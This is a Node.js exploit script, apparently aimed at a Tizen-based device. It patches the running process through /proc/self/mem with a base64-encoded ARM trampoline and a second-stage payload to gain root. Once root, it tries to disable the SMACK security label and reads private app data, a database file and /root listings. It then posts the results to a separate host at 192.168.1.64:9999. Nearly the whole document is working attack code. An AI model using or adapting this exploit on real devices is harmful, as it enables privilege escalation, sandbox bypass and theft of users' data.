var fs = require("fs");
var http = require("http");
var cp = require("child_process");

var TRAMP_B64 = "8E8t6RDQTeIAEI3lBCCN5Zxgn+UAAJblAABQ4xIAABoAAKDjAhqg4wcgoOMiMKDjAEDg4wBQoOPAcKDjAAAA7wAAUOMXAAC6CACN5WQAn+UBGqDjByCg431woOMAAADvCACd5Uhgn+UAAIblABCd5QQgneUAMIDiAUCg4QJQoOEAAFXjBAAACgRwlOQEcIPkBFBF4gAAVeP6///KAACW5TD/L+H////qAQCg4xDQjeLwj73o4O+bAADgmwA=";
var STAGE2_B64 = "8E8t6QDAoOHPcKDjAACg41TQTeIAEKDhACCg4QAwoOEAQKDhAFCg4QAAAO8BAFDhQAAACgEQoOMAGIzlnBKf5QK7jOIkEI3lAuCg4a8WQeIEKIzl9hxB4igQjeWAEp/lJACN4ggojOUFcKDjLBCN5QIQoOMMKIzlAAAA7wBgUOIKMKCzADiMtQhojLUpAAC6AqCg4QIxoOMDBKDjzRWg40gwjeVqNYPi8ATN4UwwjeVAMI3iMCCN5QQwjeUwMI3iNCCN5QggjeUUMI3lBDCd5QCQk+UEMJPlDDCN5d40iuOtOIPjGDCN5QwwneUDAFnhFAAAOgQwneUBAFrjCDCD4gQwjeUNAAAaABCg4wYAoOEBIKDhATCg4QFAoOEBUKDhBnCg4wAAAO8CMKDjADiM5QgwneUEOIzlVNCN4vCPvegBoKDj4P//6gwwneUGAKDhkBGf5TZwoOMJgEPgFCCd5QEGWOMAMKDjOJCN5QNAoOEBhqAjA1Cg4TyAjeUMkIvlAAAA7wMAUOEFAAAKCzCg4wAwi+UYMJ3lCDCL5QGWieLQ///qCBCg4QZAoOEDIKDjATCg48BwoOMAAADvAQpw4wwwoIMAMIuFCACLhfL//4ooMaDhEDCN5QQwgOIJIKDjEBCd5QIAUeEHAACKACCg4wgQoOECMKDhAkCg4QJQoOFbcKDjAAAA7+P//+oEEBPlARBB4gEKUeMtAAAqABCT5YlDAeMEAFHhKQAAGgQQg+IcEI3lBBCT5WQAUeMkAAAaCBCD4hwQjeUIEJPlBABR4R8AABoMEJPlZABR4xwAABoQEJPlBABR4RkAABoUEIPiHBCN5RQQk+VkAFHjFAAAGhhAk+UYEIPiHBCN5QQQoOGJQwHjBABR4Q0AABocEJPlZABR4woAABoIEJ3lAOCD5QEQgeIE4IPlCBCN5Qjgg+UM4IPlEOCD5RTgg+UY4IPlHOCD5QEgguIEMIPiv///6i9kZXZzeXMAAXMBDA==";
var SITE_A = 0x7aef1c;
var SITE_B = 0x7af2d0;
var ORIG_A_LE = [0xe6, 0xb3, 0xe9, 0xeb];
var ORIG_B_LE = [0xf9, 0xb2, 0xe9, 0xeb];
var TRAMP_ADDR = 0x9bed50;
var TAILPTR = 0x9befe0;
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}

var out = {};
out.started = new Date().toISOString();
out.uid_before = process.getuid();

try {
    var maps = fs.readFileSync("/proc/self/maps", "utf8");
    out.node_text_ok = maps.indexOf("00010000-009bf000 r-xp 00000000") >= 0;
    var mem = fs.openSync("/proc/self/mem", "r+");

    function readMem(addr, len) { var b = new Buffer(len); fs.readSync(mem, b, 0, len, addr); return b; }
    function writeMem(addr, buf) { fs.writeSync(mem, buf, 0, buf.length, addr); }
    function eq(a, b) { for (var i = 0; i < b.length; i++) if (a[i] !== b[i]) return false; return true; }

    var a = readMem(SITE_A, 4);
    var b = readMem(SITE_B, 4);
    out.site_a_ok = eq(a, ORIG_A_LE);
    out.site_b_ok = eq(b, ORIG_B_LE);

    var tail = readMem(TRAMP_ADDR, 96);
    var zeros = true;
    for (var i = 0; i < tail.length; i++) if (tail[i] !== 0) { zeros = false; break; }
    out.tail_zero = zeros;

    if (!out.site_a_ok || !out.site_b_ok || !out.tail_zero) throw new Error("verify failed");

    var trampBuf = new Buffer(TRAMP_B64, "base64");
    var stage2Buf = new Buffer(STAGE2_B64, "base64");
    out.tramp_len = trampBuf.length;
    out.stage2_len = stage2Buf.length;

    writeMem(TRAMP_ADDR, trampBuf);

    function blWord(site, target) {
        var off = (target - (site + 8)) >> 2;
        var w = new Buffer(4);
        w[0] = 0xeb;
        w[1] = (off >> 16) & 0xff;
        w[2] = (off >> 8) & 0xff;
        w[3] = off & 0xff;
        return w;
    }
    writeMem(SITE_A, blWord(SITE_A, TRAMP_ADDR));
    writeMem(SITE_B, blWord(SITE_B, TRAMP_ADDR));
    out.patched = true;

    var devnull = fs.openSync("/dev/null", "w");
    var t0 = Date.now();
    var r = fs.writeSync(devnull, stage2Buf, 0, stage2Buf.length, 0);
    out.trigger_ret = r;
    out.scan_ms = Date.now() - t0;

    out.uid_after = process.getuid();

    var pagePtr = readMem(TAILPTR, 4).readUInt32LE(0);
    out.stage2_page = "0x" + pagePtr.toString(16);
    if (pagePtr) {
        var st = readMem(pagePtr + 0x800, 16);
        out.st_phase = st.readUInt32LE(0);
        out.st_hits = st.readUInt32LE(4);
        out.st_ioctl = st.readUInt32LE(8);
        out.st_lastphys = "0x" + st.readUInt32LE(12).toString(16);
    }

    if (out.uid_after === 0) {
        out.id = cp.execSync("id 2>&1").toString();
        try { fs.writeFileSync("/proc/self/attr/current", "*"); out.smack_star = "set"; } catch (e) { out.smack_star = "" + e.message; }
        out.acr_test = cp.execSync("ls -la /opt/usr/home/owner/apps_rw/org.tizen.acr-service-app/data 2>&1 | head -10").toString();
        out.root_proof = cp.execSync("cat /opt/dbspace/.avoc.db 2>/dev/null | head -c 16 | od -An -tx1 2>&1; echo; head -3 /opt/etc/localtime 2>&1; ls -la /root/ 2>&1 | head -5").toString();
    }
    out.success = out.uid_after === 0;
} catch (e) {
    out.error = "" + (e.stack ? e.stack : e);
}

post("/audit20_gadget", out);
